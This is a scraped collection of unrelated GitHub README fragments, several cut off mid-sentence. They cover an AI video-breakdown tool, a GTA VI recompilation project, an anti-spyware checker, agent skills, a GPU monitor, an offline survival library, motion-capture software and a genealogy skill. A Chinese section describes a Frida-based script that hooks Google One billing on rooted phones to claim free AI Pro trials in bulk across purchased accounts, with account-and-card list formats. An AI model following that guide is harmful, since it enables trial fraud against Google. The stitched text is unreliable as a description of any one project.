I have not launched and will not launch any cryptocurrency token. Any token using this project’s name is not affiliated with me, and I do not endorse it or accept fees from it. Please be cautious of scams.** [![Stars](https://img.shields.io/github/stars/JuneYaooo/rea-video?style=flat)](https://github.com/JuneYaooo/rea-video/stargazers) ![Python](https://img.shields.io/badge/python-%E2%89%A53.10-blue) ![Agent](https://img.shields.io/badge/runs%20in-Claude%20Code%20%7C%20Codex-8A2BE2) [![Output: VIDEO.md](https://img.shields.io/badge/output-VIDEO.md-3d4fd6)](https://videomd.github.io/videomd/) [![Visit our website](https://img.shields.io/badge/Visit%20our%20website-6644D8?style=for-the-badge)](https://www.reavideo.ai) [![Join our Discord](https://img.shields.io/badge/Join%20our%20Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://discord.gg/dZj8D3GqWT) [![WeChat group](https://img.shields.io/badge/WeChat%20group-07C160?style=for-the-badge&logo=wechat&logoColor=white)](i18n/README_zh.md#社区) [![Follow on X](https://img.shields.io/badge/Follow%20%40yao__june12106-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/yao_june12106) ⭐ *Help more people find rea-video. Star this repo!* Left: a TikTok ad shot on a phone. Right: an AI remake with another product. rea-video's verdict: the left is all live footage, one set and two camera positions; the right is all AI, 8 shots across 3 generations.
## Quick start rea-video is built for AI agents. In Claude Code, Codex or any agent that can run commands, say: ```text Install https://github.com/JuneYaooo/rea-video, then break down this video: /path/to/video.mp4 ``` The agent installs the CLI, learns the workflow and runs the whole thing. You need ffmpeg and Python 3.10+. You can also install rea-video as an agent plugin, which adds its skill to your agent: ```bash # Codex codex plugin marketplace add JuneYaooo/rea-video codex plugin add rea-video@rea-video # Claude Code claude plugin marketplace add JuneYaooo/rea-video claude plugin install rea-video@rea-video ``` `.agents/plugins/marketplace.json` is the agent-agnostic marketplace entry. The agent still installs the CLI the first time it runs a breakdown. Breakdowns are fully upgraded. Each one gives you two outputs: - **Report** (`report.html` / PDF), for you: more reader-friendly, with a clearer structure, easier to learn from and to understand how the video was made and how to remake it. - **[VIDEO.md](https://videomd.github.io/videomd/)**, for your AI: layered, so the AI reads only what a question needs and uses fewer tokens. You can also hook up a video-capable model (Gemini or Doubao both work) by giving the agent its endpoint and key. That makes the live/AI/3D calls more accurate and adds a reverse-engineered prompt for every shot. It works fine without one; if your agent can see images, it checks the uncertain shots itself. > Reports are written in whichever language you ask in (Chinese or English). The example reports below are in English. ## Updates - **2026-11-21**: Clearer report layout. Remake plans default to the official MiniMax H3 and follow the model you name. - **2026-11-19**: Magic videos: finds the reveal of each trick, frame by frame with a slow-motion clip. Highlights (twists, climaxes, goofs) when you ask for them. - **2026-11-17**: Better timing of cuts and moves. - **2026-11-15**: Remake plans are made for the model you choose. basic_info.description: Leonida Is A Native PC Recompilation Of The Xbox Version Of Grand Theft Auto 6

content.readme:
Leonida

Grand Theft Auto VI (Xbox Series) running natively on Windows, built on your PC from your own copy.

Status | How to build | How it works | Want to help? | Credits | License | Discord

Leonida is a static recompilation project. The Xbox Series CPU is x86-64 like a PC, so the game's code is loaded and run natively, and the console's system software is reimplemented. The console's precompiled RDNA2 GPU programs are translated to SPIR-V for Vulkan. The game's models, textures and audio are read from your package. All of this happens **on your PC, from your own copy of the game**. > [!IMPORTANT] > This repository **does not contain the game, keys or an executable**, and it does not explain how to get them. You > need your own copy, with its files already readable on disk. Nothing here decrypts or works around any protection. > Everything the build creates (the generated shaders, extracted assets, the runtime folder and your saves) comes > from your game and stays on your PC. Never share those files. Discord: https://discord.gg/rexed
## Project status **Early. The game does not boot yet.** Everything that can be done without the game's executable is in place, so work on booting can start as soon as one is available to a developer. | What | Status | |---|---| | Finding and checking your copy (Xbox Series 1.0.2.1) | ✅ Works | | Shaders: carve, unpack native RDNA2 code, disassemble | ✅ All 26,503 | | Shaders: RDNA2 → SPIR-V translation | ✅ **All 26,503** (disassembled with LLVM 21; LLVM 23 leaves 1,471 rejected for now, #644): 2,236 VS, 12,101 PS, 2,689 CS, 9,282 mesh, 195 geometry. All pass `spirv-val`, with a per-shader metadata index for pipeline creation. ⚠️ 21,545 are wave64: exact on 64-wide subgroups (AMD). On 32-wide subgroups (NVIDIA, Intel), compute and mesh shaders are exact with wave64 emulation (`--wave64-emulate`, on by default there); cross-half wave ops in vertex, pixel and geometry shaders are still approximate | | Shader translator checked on a real GPU | ⚠️ The hand-written GPU tests (vertex fetch, texture sampling, exports, ALU ops, partial-register ops, barycentrics, wave-uniform branches, compute LDS/barriers/buffer stores, wave64 masks) have been run on more than 30 GPU and driver combinations, with results in [#166](https://github.com/ItsNotRexed/Leonida/issues/166): NVIDIA Turing, Ampere, Ada and Blackwell (Windows and Linux); AMD GCN3, RDNA1, RDNA2, RDNA3 and RDNA4 (Windows driver and RADV); Intel Gen9 (ANV); Apple M1 (MoltenVK, no geometry or mesh stages); and Mesa llvmpipe. Wave64 tests need 64-wide subgroups (AMD) or `LEONIDA_W64_EMULATE=1`. These are small test shaders: the game's own shaders are checked by `spirv-val` and by driver pipeline creation (`vk_pipeline_check`), not by their output | | Models (OBJ with real names, UVs, material references) | ✅ Exported. Not all layouts are decoded yet | | Texture dictionaries and world texture pools (DDS) | ✅ Exported. Pool entries stored as BCPack are still skipped by the export; a clean-room decoder (`tools/bcpack.py`) rebuilds BC1, BC3, BC4, BC5, BC6H and BC7 (most BC6H/BC7 chunks need a local history table, which the repo does not ship), and is not wired into `rpf9dump` yet ([notes](docs/textures.md)) | | Audio banks (AWC: Opus, XMA2) | ✅ Exported whole. Opus repackaged **losslessly** as Ogg Opus; PCM (codec 0/2) as WAV; XMA2 decoded with ffmpeg. `--wav` adds 16-bit PCM WAV ([notes](docs/audio.md)) | | Music/radio config | ? Measured. **1,589** audio-config records with exact durations and AWC stream ids; station grouping and content-id lists; no per-track start offsets ([notes](docs/audio_config.md)) | | PE loader and import shims | ⚠️ Runs a stand-in executable end to end (`gta6rt --run`: CRT startup, statics, heap, files, threads, GDK imports through the shims, exit code back). Controllers through a GameInput shim on SDL3 (any controller SDL supports, rumble, DualSense trigger effects and lightbar; built when SDL3 is installed or with `-DLEONIDA_SDL3_FETCH=ON`, [notes](docs/gameinput.md)). `--trace-d3d12` logs every D3D12 call and its outcome for the first boot. Untested against the real executable | | Xbox D3D12 → Vulkan | ⚠️ In progress. A Vulkan-backed device behind the Xbox-ABI proxy creates queues, command lists, fences, descriptor heaps, committed and reserved resources, render-target and depth views (3D targets included), texture views and samplers (2D, cube and 3D views, the depth and stencil planes of depth-stencil textures, packed formats such as B5G6R5, B4G4R4A4 and R9G9B9E5; they go into the bindless set), and query heaps. content.readme:
# Zero Breach Toolkit

> **Version 3 is out:** besides looking for known spyware, it now shows the ways in left open on your devices,
> checks the links, emails, files and QR codes people send you, and walks you through your accounts and home
> network. A double-click app for Windows, Mac and Linux, in 27 languages.
> [Download it from the latest release](https://github.com/interplains/Zero-Breach-Toolkit/releases/latest).

> **Your antivirus may delete the program without asking.** Microsoft Defender and other antivirus
> products sometimes wrongly remove new programs that are not code-signed yet. If the download vanishes,
> will not open, or you see "Threat found", it is a false alarm when the file came from the official
> release page. See [If your antivirus removes it](#if-your-antivirus-removes-it) for safe ways round it. Checking a phone?
> [The browser check](#phone-backup-check-it-in-your-browser) needs no download at all.

A free, open-source check for traces of known mercenary spyware (Pegasus, Predator,
Graphite, Candiru and others) on computers, Android phones and iPhone backups.

- **Read-only.** It does not modify source evidence or system settings. It writes only
  temporary database snapshots and the reports you ask for.
- **No network requests during a scan.** It never looks up spyware addresses and has no
  upload feature. Python network calls are blocked and redirected paths are refused. This
  is not an operating-system network sandbox; see [PRIVACY.md](PRIVACY.md).
- **States its limits.** Every report says what was found, how strong the evidence is, and
  what could not be checked. A clean result is never presented as proof that you are safe.

Made by archivegenocide. Built on [Zero Breach](https://github.com/interplains/zero-breach).

> **If you think you are being targeted right now, get expert help first.** You do not
> need to run this tool before asking. Journalists, activists, human-rights defenders and
> civil society can contact the
> [Access Now Digital Security Helpline](https://www.accessnow.org/help/) (free, 24/7,
> many languages) or [Amnesty International's Security Lab](https://securitylab.amnesty.org/get-help/).

---

## Phone backup? Check it in your browser

To check an **iPhone backup** or an **Android collection** there is nothing to install: open
[archivegenocide.com/scan/phone](https://archivegenocide.com/scan/phone/) on the computer that holds
the backup, choose the backup folder, and you get the same result as the program, in your language.
Nothing is uploaded. The check runs inside a part of the page whose security settings forbid every
network connection, and before it opens your backup it proves this by trying to reach the site and
showing you that your browser blocked it. The page's code is in [`web/phone/`](web/phone/).

A web page cannot look at the computer itself (its programs, start-up items and connections). To
check a computer, use the program below.

## Easiest: download the program (no Python, no commands)

**You do not need to know anything technical to use this.** Download one file from the
[latest release](https://github.com/interplains/Zero-Breach-Toolkit/releases/latest), open it,
and follow the window. You do not need the source code on this page, and you do not need to
type any commands.

Once it is open: choose a check, press **Start check**, and read the result. It tells you in
plain words whether anything was found and what to do next. You can save the report if you
want to keep it or show it to someone helping you.

**Which check?** Use **Standard** unless you have a reason not to: it covers browsers, apps,
startup items, program files and out-of-date programs (usually 15 to 20 minutes). **Quick** looks
at browsers only (5 to 10 minutes). **Full** adds web caches and more file types (30 minutes or
more). You can press **Stop** at any time and keep what has been checked so far. To check a
phone, choose **A phone** in the window; the guides there explain what you need first.

**A green result is good news, not a guarantee.** It means this check found none of the published
traces it looks for, in the places it could read. It cannot find spyware nobody has published
traces of, and it does not prove a device is safe. If you think you are being targeted, ask a
digital-security helpline even if the result is green.

**Your antivirus may flag or delete these programs.** It is a false alarm if the file came from [the official release page](https://github.com/interplains/Zero-Breach-Toolkit/releases/latest); see [If your antivirus removes it](#if-your-antivirus-removes-it). **If the file came from anywhere else, do not run it and trust the warning.**

### Windows

1. Download `zero-breach-toolkit-windows-x64.exe`.
2. Double-click it in your Downloads folder.

# tstack

The agent skills I use every day, cleaned up so anyone can use them. They work
in Claude Code and Codex. Some use [T3 Code](https://github.com/pingdotgg/t3code)
features when they are available and fall back to native tools when they are
not.

## Skills

| Skill | Say | What it does |
|---|---|---|
| `full-send` | "full send" | Takes a change to a merged PR with nobody watching: proves it, reviews it, files it, babysits it, merges it. |
| `full-stop` | "full stop" | Same as `full-send`, but stops when the PR is ready for you to merge. |
| `council` | "council" | Gets review from three models from different providers, and loops until they agree. |
| `sol-loop` | "sol loop" | Reviews a change with GPT Sol in a loop until both agents agree. |
| `file-pr` | "file a PR" | Files a short PR that leads with the problem, not an inventory of changes. |
| `takeover` | "take over" | Finishes someone else's PR, branch, or agent thread, and keeps their credit. |
| `babysit-pr` | "babysit" | Watches a PR through CI and review bots, and fixes the real findings. |
| `modernize` | "modernize" | Rebases an old PR and decides if it should still exist. |
| `leaving-pr-comments` | (automatic) | Formats comments that an agent posts on your behalf. |

Some skills call others. Install the ones they need too:

- `full-send` uses `sol-loop`, `file-pr`, and `babysit-pr`.
- `full-stop` uses `full-send`.
- `takeover` uses `modernize`, `file-pr`, `babysit-pr`, and `leaving-pr-comments`.
- `file-pr`, `babysit-pr`, and `modernize` use `leaving-pr-comments`.

## Install

```bash
git clone https://github.com/t3dotgg/tstack
cp -R tstack/skills/* ~/.claude/skills/   # Claude Code
cp -R tstack/skills/* ~/.codex/skills/    # Codex
```

## Requirements

- An authenticated [GitHub CLI](https://cli.github.com) (`gh`).
- `python3` for `babysit-pr`'s `pr-wait` script.
- `council` and `sol-loop` need subagents on other providers' models. T3 Code
  does this with `delegate_task`. Otherwise you need a harness that can run
  those models.

## Make them yours

These are starting points. Edit them. Put personal settings, like which models
sit on your council, in your `CLAUDE.md` or `AGENTS.md`, so you can update the
skills without losing them.

content.readme:
# gputaskman

**An `htop` for what's inside your GPU, not just how full it is.**

Windows with NVIDIA/AMD telemetry and Intel WDDM activity, plus Linux and WSL support (NVIDIA
everywhere, AMD and Intel on native Linux; see
[Linux and WSL](#linux-and-wsl)) and macOS on Apple Silicon (see [macOS](#macos-apple-silicon)). A terminal UI
that connects per-process GPU memory and engine activity with loaded runtimes, model files, and
LLM buffer breakdowns.

Task Manager says "15 GB used." This tries to answer: *by what? Model weights? KV cache?
Your browser? The desktop compositor? And why is so much GPU memory in system RAM?*

**Scope: local GPU workloads, not cloud services.** Decision models, vision, speech, LLM inference,
training/fine-tuning (including Unsloth), graphics, and video all belong here. Visibility varies:
process memory and engine activity are measured; identifying individual models and their work
requires supporting evidence. A PyTorch/CUDA DLL alone cannot identify a model or prove training,
and a mapped file does not prove that model is resident on the GPU or being exercised.
CPU-only, NPU-only, and cloud workloads are out of scope.

![Live GPU overview with an LLM's weights, KV cache, and compute buffer breakdown](docs/screenshots/overview.png)

> Early, experimental software. Device and process counters are measurements; classifications
> and GGUF-derived breakdowns are estimates. This does not dump VRAM or enumerate a game's textures.

## Install from PyPI

[gputaskman is on PyPI](https://pypi.org/project/gputaskman/). No repository clone is needed:

```powershell
uv tool install gputaskman
gputaskman
```

Or, with [pipx](https://pipx.pypa.io/):

```powershell
pipx install gputaskman
gputaskman
```

Works on Windows, Linux/WSL, and macOS with Python 3.11+ and the supported GPU/driver
configuration described below. Both installers keep the app in an isolated environment.
The shorter `gtm` command is also available. Upgrade with `uv tool upgrade gputaskman`
or `pipx upgrade gputaskman`; `gputaskman --version` shows what you have, and the TUI shows it
under the GPU panel. Each [release](https://github.com/shanselman/gputaskman/releases) lists what
changed. For Windows without Python, use the portable download below.

## Portable Windows download

The [Releases page](https://github.com/shanselman/gputaskman/releases) is where tagged builds
publish two portable ZIPs: `gputaskman-VERSION-windows-x64.zip` for Intel/AMD Windows PCs, and
`gputaskman-VERSION-windows-arm64.zip` for native Windows ARM64. These are separate native builds,
not a universal executable.

Extract the **entire ZIP**, keeping `_internal` beside `gputaskman.exe`. Open Windows Terminal
or PowerShell in the extracted folder:

```powershell
.\gputaskman.exe
.\gputaskman.exe --once
.\gputaskman.exe --json
```

No Python, uv, CUDA Toolkit, model download, or installation is needed. A supported GPU with a
current Windows WDDM driver is required. Builds are currently **unsigned**; code signing
and an installer are not part of this initial distribution. Each ZIP includes licenses and a
`.zip.sha256` companion file is published for integrity checks.

## Clone and run

Use **64-bit Windows 10/11** with a current WDDM driver and a terminal
(Windows Terminal is recommended). Live workload checks have included an RTX 4080 SUPER and an
RTX Spark N1X on Windows ARM64. CUDA workloads are supported on ARM64 with a compatible NVIDIA
driver and ARM64 CUDA runtime.

AMD live check: Radeon 860M Graphics on Windows 11 Enterprise build 26300, AMD driver 32.0.22050.1003.
During desktop/browser activity, WDDM reported per-process VRAM and AMD ADL reported GPU utilization,
clocks, and ASIC power; temperature, memory activity, and PCIe readings were unavailable. Vulkan/ROCm
workloads were not tested on this machine.

Intel and Qualcomm adapters on Windows can use WDDM's per-process memory and engine counters. When those
counters are available, device GPU activity is the busiest WDDM engine after combining its process counters.
An Intel or Qualcomm adapter reporting at most 512 MiB of dedicated memory and more shared system memory is
treated as integrated: per-process local usage is shown as Shared RAM, not VRAM, while device dedicated and
shared counters remain separate. This is a DXGI-capacity heuristic. Qualcomm GPU activity uses the WDDM
adapter counter; temperature, power, clocks, and memory activity are not currently available on Windows.
Arc B580 behavior is covered by mocked counters but has not been validated on Intel hardware.
When a Windows telemetry provider does not supply a version, gputaskman reads the selected adapter's
`DriverVersion` from its exact PnP device's driver registry key. If that value is unavailable, the
driver remains unknown.

Install [Git for Windows](https://git-scm.com/downloads/win) and
[uv](https://docs.astral.sh/uv/getting-started/installation/) if needed. With WinGet:

```powershell
winget install --id Git.Git --exact
w

# Lastbook

Lastbook is an offline survival library for Mac, Windows and Linux. It puts manuals, videos, encyclopedias, an offline map and
short practical guides on one computer. After setup, it works offline. The desktop sidebar opens Videos, Map and Chat.
Chat answers questions using the library, including the offline encyclopedias when they are present, and links to its sources.

Website: <https://lastbook.org>. Contact: hello@lastbook.org.

> Lastbook’s original code and documentation are licensed under the [MIT License](LICENSE).
> Contributions are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) to get started.

## Release status

| Platform | Version | Status |
|---|---|---|
| macOS (Apple Silicon, macOS 14 or later) | 1.1.15 | Live on lastbook.org, signed and notarized |
| Windows (64-bit, Windows 10 or later) | 1.1.15 | Live on lastbook.org, Authenticode signed |
| Linux (Ubuntu 24.04 or 26.04 LTS, x86_64) | 1.1.15 | Ubuntu packages; installation instructions below |

## iPad (development preview, source only)

A native iPad app (Videos, Map and Chat, offline, with optional on-device AI) is in [`mobile/ipad/`](mobile/ipad/).
- It is source for contributors to build and sign themselves.
- There is no App Store, TestFlight or downloadable iPad build.
- See [mobile/ipad/README.md](mobile/ipad/README.md) for what works, the current limitations and how to build it.

## Install on Linux

The Linux packages target **Ubuntu 24.04 LTS and Ubuntu 26.04 LTS on Intel/AMD x86_64 computers**, one package for each. Download
[Lastbook for Ubuntu 24.04](https://downloads.lastbook.org/Lastbook_1.1.15_amd64.deb) (or [for Ubuntu 26.04](https://downloads.lastbook.org/Lastbook_1.1.15_ubuntu26.04_amd64.deb)), then install it with apt so Ubuntu resolves its dependencies.

```bash
sudo apt install ./Lastbook_1.1.15_amd64.deb                  # Ubuntu 24.04
sudo apt install ./Lastbook_1.1.15_ubuntu26.04_amd64.deb      # Ubuntu 26.04
```

Open Lastbook from the application menu. First-run setup downloads your chosen library, state map and optional local AI.
The app uses Ubuntu's GTK, WebKitGTK and media codecs. Its own files install under `/opt/lastbook`, and your library and
settings stay in your home folder. Removing the package leaves those downloaded files and settings in place.

The Linux release was tested on Ubuntu 24.04.5 in WSL2, including installation, setup, video playback, maps, address search,
PDF reading, offline AI with citations, shutdown and uninstall. AI tests used the CPU. Native Linux GPU performance and
other Linux distributions have not been validated for this release.

## What it does

- **Guides first.** Short, curated guides for urgent needs (`content/topics/`), each pointing to real pages in the library
  with page numbers, plus what curators looked for and did not find (`content/gaps.json`).
- **The full library.** Manuals and PDFs (with a whole-PDF view), videos, and offline encyclopedias (ZIM files), with
  keyword search everywhere and meaning-based search on Windows.
- **Offline map.** A base map of the world and the US, plus a detailed map for the state selected during setup: local streets,
  buildings, terrain, crops, and water, help and resource points. Addresses in that state can be found offline. The person
  picks the state; Lastbook never detects location.
- **Optional local AI.** Ask questions in plain words and get answers that cite library pages, from a model that runs on
  the computer itself (see "The local AI" below). Without it, Chat still finds the right pages.

export motion with AI processing running locally.

## Install and run

The steps below cover Windows. For the experimental x86-64 Linux AppImage and
source installation, see the [Linux guide](https://github.com/toyxyz/toyxyz_RGBMocap/blob/linux_support/docs/LINUX.md#test-the-appimage-on-linux-mint).
The AppImage was tested on WSL 2. Native Linux Mint testing is welcome.

> [!IMPORTANT]
> On Windows 11, Smart App Control in **On** mode may block the unsigned private
> Python runtime used by RGB MoCap. This can stop installation or launch.
> See [Smart App Control troubleshooting](docs/USER_GUIDE.md#smart-app-control-on-windows-11).

1. Install [Git for Windows](https://git-scm.com/download/win). Use a short, writable
   installation path such as `C:\RGBMoCap`. Open **Command Prompt** to clone
   the repository. Adjust the path if you need a different folder.

   ```cmd
   git clone https://github.com/toyxyz/toyxyz_RGBMocap.git C:\RGBMoCap
   cd /d C:\RGBMoCap
   ```

2. Prepare the runtimes for ExMR, FlowHMR and GVHMR with their supported add-ons,
   plus PEAR live-preview support,
   Blender, FFmpeg and native motion correction. AI weights and registered body
   files are downloaded separately in Model Manager:

   ```cmd
   install.cmd
   ```

3. Start the app:

   ```cmd
   RGBMoCap.cmd
   ```

   Keep the console open while the app runs. Prepare the AI model files separately
   using **Model Manager**; some require account registration and manual download.

If setup fails with `WinError 3` or `WinError 206` and the error shows a long
path, see [Windows path length troubleshooting](docs/USER_GUIDE.md#windows-path-length-during-installation).

To update, close the app and run `update.cmd` from the same folder. See the
[installation guide](docs/USER_GUIDE.md#install) for disk space, prerequisites
and recovery.

Updates reuse recently verified, unchanged runtimes. If PEAR or camera-alignment
support preparation fails after the base installation succeeds, the base app
remains usable; rerun `install.cmd` to retry the unavailable support. See
[verification and repair](docs/USER_GUIDE.md#installation-verification-and-repair).

### Optional model runtimes

`install.cmd` prepares ExMR, FlowHMR, GVHMR and the small shared-runtime support
for [PEAR live preview](docs/models/PEAR.md). Install the following only if
you use them, after the base installation:

| Model | Separate setup command | Installation and usage |
| --- | --- | --- |
| MAMMA | `Setup_MAMMA.cmd` | [MAMMA guide](docs/MAMMA.md) |
| PromptHMR | `Setup_PromptHMR.cmd` | [PromptHMR guide](docs/models/PROMPTHMR.md) |
| GEM-X | `Setup_GEMX.cmd` | [GEM-X guide](docs/models/GEMX.md) |

MAMMA and PromptHMR require **Visual Studio 2022 C++ Build Tools**, the Windows SDK and
**CUDA Toolkit 12.8** for local native builds. Close the app and review the
provider terms before setup. Then reopen it and prepare the selected model's
files in **Model Manager**. Their optional runtimes do not require each other;
`install.cmd` and `update.cmd` do not install them.

GEM-X uses the existing ExMR Python base with its own pinned inference packages.
Run its separate setup after `install.cmd`, then prepare its public files in
**Model Manager**. It does not require the C++ build tools or CUDA Toolkit.

PEAR reuses the base shared runtime with a small support overlay prepared by
`install.cmd` and `update.cmd`. No separate setup or compiler is required.
Model files are prepared separately.

For optional text-prompt and click-guided **Find person** tracking on Windows,
run `Setup_SAM31.cmd` after the base setup. Then choose **SAM 3.1** next to
**Find person** and use **Auto Download** on its 1.75 GB checkpoint row in
**Model Manager**. SAM 3.1 uses more VRAM than **Default** tracking.
**Resource Mode > Automatic** can offload tracking state and masks to system
RAM when VRAM is tight and retry once after CUDA runs out of memory.
See the [SAM 3.1 tracker guide](docs/models/SAM31.md#vra

# ex-USSR Kinship Research

![ex-USSR Kinship Research cover](docs/cover.jpg)

Languages: [English](README.md) / [Русский](README.ru.md) / [Беларуская](README.be.md) / [Қазақша](README.kk.md) / [Українська](README.uk.md) / [Polski](README.pl.md) / [Deutsch](README.de.md) / [Română](README.ro.md) / [Eesti](README.et.md) / [Latviešu](README.lv.md) / [Lietuvių](README.lt.md) / [ქართული](README.ka.md) / [Հայերեն](README.hy.md) / [Azərbaycanca](README.az.md) / [Кыргызча](README.ky.md) / [Тоҷикӣ](README.tg.md) / [Türkmençe](README.tk.md) / [O‘zbekcha](README.uz.md) / [日本語](README.ja.md)

**An evidence-first genealogy skill for AI agents (Codex, Claude Code and other Agent Skills runtimes).** It turns an agent into a careful family-history researcher for the former USSR, the Soviet Union and the Russian Empire. The agent reads church books and civil records, military, deportation and repression files, and unindexed archive scans. It keeps every find traceable, separates records from interpretation and says plainly what is proven and what is not.

Coverage includes all 15 former Soviet republics: Russia, Ukraine, Belarus, Moldova, Estonia, Latvia, Lithuania, Georgia, Armenia, Azerbaijan, Kazakhstan, Kyrgyzstan, Tajikistan, Turkmenistan and Uzbekistan. Archives are chosen by the event's historical jurisdiction and current record custodian; a regional example does not replace local research.

The skill's instructions are written in Russian, but **the agent talks to you in your language**: English, Ukrainian, Russian, Polish, German and so on. It quotes sources in their original spelling with a translation, and builds search queries in the languages of the records.

---

## What it does

- **Case intake and scope.** One research question, known facts, who may be alive, what is off-limits.
- **Reproducible registers.** Persons, artifacts, claims, relationships and a full search log (CSV), plus a final report template.
- **Historical jurisdiction model.** It resolves every event to the state, province, district, parish or civil registry *as of the event date*, not today's map.
- **Name-variant matrices.** Pre-reform Russian, Ukrainian, Polish, Romanian, German and Yiddish forms, patronymics, maiden names and transliterations.
- **Source strategy.** Originals first, then official catalogs, indexes, published document collections, and only then trees and forums as leads.
- **Evidence protocol.** Claims get explainable statuses, not percentages: `hypothesis`, `single-source`, `corroborated`, `strongly-corroborated`, `contradicted`, `unresolved`. Copies and mirrors of one record share an `independence_group`, so they never count as independent proof.
- **Identity resolution.** Namesakes stay separate `person_id`s until distinguishing evidence appears: house number, parents, godparents, exact birth date or military unit.
- **Audit script.** It checks referential integrity and flags weak corroboration before you write conclusions. An independence group counts only when a cited artifact belongs to it, so corroboration cannot be declared into existence. It also checks IDs and statuses in the working Markdown report, if present; the agent checks the delivered HTML against the registers. A summary shows what is still uncorroborated or marked illegible.
- **Institutional requests.** Draft and, when authorized, send focused requests to archives, libraries, universities and museums using available email or official web tools. If needed, offer a supported mail integration or a ready-to-send letter. Record the outcome, avoid duplicate sends and treat replies as evidence. See [correspondence guidance](references/correspondence.md).
- **Archive request form.** An anonymized [CANO vital-record request template](assets/cano-vital-record-request.template.docx) preserves the supplied form's layout for an editable case copy. Verify the archive's current form and submission requirements before use.
- **Government services.** Choose an official civil-registration or archive request route, checking eligibility and how the result is delivered ([government portals](references/government-portals.md)).
- **Final report.** A complete HTML report is the default deliverable, with each relationship laid out edge by edge, contradictions, failed searches and concrete next steps. PDF is an optional export only when you explicitly request it.
- **Targeted indexed-record research.** Find relevant FamilySearch books by place or DGS through an existing lawful browser session, view specific records, and retain only evidence fragments permitted by the source. Local helpers search relatives, witnesses and name variants in saved fragments, preserving their context and file checksums. [Workflow and coverage limits](references/familysearch-indexes.md).
- **Connected FamilySearch MCP.** Use a connected server for structured searches, profiles, relatives and sources, and authorized tree changes with explicit scope and read-back. Keep indexed search separate from unin

两个版本 **简单版**：一个网页，双击 `web/index.html` 打开，登录 → 绑卡 → 点一下，完事。不用装 Python，不用 root，不用数据线。 **脚本版**：`pro.py`，要一台 root 手机和 frida。优点是 offer 从真实客户端取，不依赖浏览器指纹。 先试简单版，不行再上脚本。 ## 需要什么 一台 root 过的安卓手机，USB 连着电脑。Magisk、KernelSU、APatch 都行。 **没有手机就用 MuMu 模拟器。** Windows 装 MuMu Player 12，Mac 装 MuMu Pro（需 Apple Silicon），在设置里打开「ROOT 权限」并重启。向导会自动用 adb 连上它，frida-server 按模拟器架构自动选（MuMu-Windows 是 x86_64，MuMu-Mac 是 arm64），后面的流程和真机一样。 电脑上要 Python 3.9 以上，外加两个包： ```bash pip3 install frida ``` adb 用 Android SDK 里的 platform-tools。装好后 `adb devices` 能看到手机就行。没装过的话，Mac 上 `brew install android-platform-tools`，Windows 去下 platform-tools 压缩包，解压后把目录加进 PATH。 手机上要开「开发者选项 → USB 调试」，插上后在弹窗里点允许。 ## 用法 ### 最简单：双击启动（不碰命令行） Mac 双击 `start.command`，Windows 双击 `start.bat`，会打开一个向导：自动检查环境 → 粘账号 → 逐个开通 → 终端里出一张结果表格，最后打印报告目录。没有安卓手机也行，向导第一步会带你连 MuMu 模拟器。向导菜单最后一项（或 `--advanced`）退回下面的命令行用法。 ### 简单版怎么用 源码在 `web/index.html`，单文件，下载后双击就能用，浏览器会打开一个页面： 1. 点「去登录」，用要开的谷歌账号登进去 2. 点「去绑卡」，绑一张卡，卡里留 1 美元就行，试用期间不扣 3. 回页面，点对应的套餐卡片 跳到 Google 的结算页之后，确认金额是 0，点订阅即可。 ### 脚本版怎么用 先自检一遍环境，它会检查设备、root、frida-server、推送计费模块，还会顺手关掉会拦截 Play 网络的代理和 Clash： ```bash python3 pro.py --check ``` 全绿就可以跑号了。 账号写成一个文本文件，一行一个，字段用四个短横线隔开： ``` 邮箱----密码----辅助邮箱----2FA密钥----卡号----有效期----CVC----持卡人----邮编 ``` 后面几项留空也行。刚买的新号一般没有 2FA，那就留空： ``` abc123@gmail.com----mypassword---- ``` 带卡的话： ``` abc123@gmail.com----mypassword--------4242424242424242----10/29----326----ZHANG SAN----97201 ``` 地址不填会默认用 `123 Main St, Portland, OR 97201`，俄勒冈免消费税。 跑： ```bash python3 pro.py accounts.txt ``` 单个号也可以： ```bash python3 pro.py --account "abc@gmail.com:密码:2FA密钥" ``` `ultra0.py` 是同一套代码，参数一致；`pro.py` 只是把 `--plan pro` 设成默认。 想看结果，开订阅页确认一下： ``` Play 商店 → 头像 → 付款和订阅 → 订阅 ``` ## 它内部干了什么 1. 把账号加到手机（没有就加，有就跳过） 2. 切 Play 账号。切完一定从头像面板读回来核对，对不上直接退出，不会跑到别的号上 3. 启动 Google One，用 Frida 挂进去，`DexClassLoader` 加载计费模块 4. `queryProductDetailsAsync` 查 `g1.2tb.ai.subs_variant`、`g1.play.2tb.ai`、`g1.2tb.ai` 三个商品 5. 挑免费期最长的那个（`12months-eft`，P1Y），在主线程调 `launchBillingFlow` 6. 盯着收银台。看到价格是 0 或者「免费试用 12 个月」才点订阅；看到「不符合免费试用条件」就关掉，绝不点 7. Play 有时会要求重新输密码，脚本自己填 8. 打开订阅页核对，结果写进 `ultra0-report/` ## 失败的时候是什么情况 **账号不符合资格。** Play 会说「您不符合免费试用条件，尽管如此，您仍能订阅」。一个号基本只有一次机会：试用一旦发起过，哪怕没确认，offer 也会消失。所以别拿主力号试。 **没有付款方式。** 订阅必须有卡。Play 的加卡页是 WebView，adb 填不进去，脚本会停下来提示你在手机上填完再按回车。每台设备手动绑一次，之后所有号共用这张卡。 **Play 账号没切过来。** 脚本会打印当前实际登录的是哪个号，然后退出。这时手动在 Play 里切一下，加上 `--no-switch` 重跑，让它只做校验不再尝试切换： ```bash python3 pro.py accounts.txt --no-switch ``` **收银台没弹出来。** 重跑一次。连续两次都不弹，检查一下设备的网络：`settings get global http_proxy`，不是 `null` 就清掉；Clash 这类 VPN 会劫持 DNS，也会让 Play 连不上。 ## 一些参数 ```bash --plan pro # 默认，只查 AI Pro 5TB --plan 5x # 查 Ultra 20TB（已下架，仅备用） --plan 20x # 查 Ultra 30TB（已下架，仅备用） --no-add # 账号已经在手机上，跳过加号 --no-switch # 不自动切账号，只校验当前账号 ``` ## 几个说明 试完之后记得去 Play 里取消订阅，不然到期会扣 $99.99。 脚本只在本地跑，账号密码和卡号不联网，也不上传任何地方。报告文件在 `ultra0-report/`，里面有 offer 明细和每步结果。 这段代码只对 Play 结算流程里「客户端能拿到试用 offer」这件事做了利用，没有改任何服务端数据。 ## 交流 技术讨论群，随便进一个。**进群前先看[群规则](RULES.md)：禁止一切广告，违者移出。**

content.readme:
# ung220z-tool

